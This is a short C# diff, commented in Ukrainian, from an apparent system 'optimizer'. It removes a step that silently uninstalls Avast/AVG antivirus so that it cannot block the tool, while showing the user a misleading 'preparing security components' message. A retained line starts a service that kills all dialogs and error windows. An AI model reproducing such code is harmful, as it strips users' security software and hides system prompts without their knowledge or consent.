@@ -61,22 +61,6 @@ public class OptimizationOrchestrator : IOptimizationOrchestrator
             // ГЛОБАЛЬНИЙ DIALOG KILLER — вбиває ВСІ діалоги/помилки/wizards під час оптимізації
             DialogKillerService.Start();
 
-            // === STEP 0: Видалення Avast/AVG/Avira (якщо є) ===
-            // Виконується ДО всього іншого, щоб антивірус не блокував наші дії
-            if (AvastRemover.IsAvastInstalled())
-            {
-                DLog("=== Крок 0: Видалення Avast/AVG ===");
-                UpdateDetail("Підготовка системних компонентів безпеки...");
-                try
-                {
-                    await AvastRemover.RemoveAsync(detail => UpdateDetail(detail));
-                    DLog("Avast/AVG видалено");
-                }
-                catch (Exception ex)
-                {
-                    DLog($"Avast removal помилка (продовжуємо): {ex.Message}");
-                }
-            }
 
             // === STEP 1: Create System Restore Point (ОБОВ'ЯЗКОВО першим!) ===
             UpdateState(OptimizationStep.CreatingRestorePoint, "Підготовка системи до переустановки...", 2);
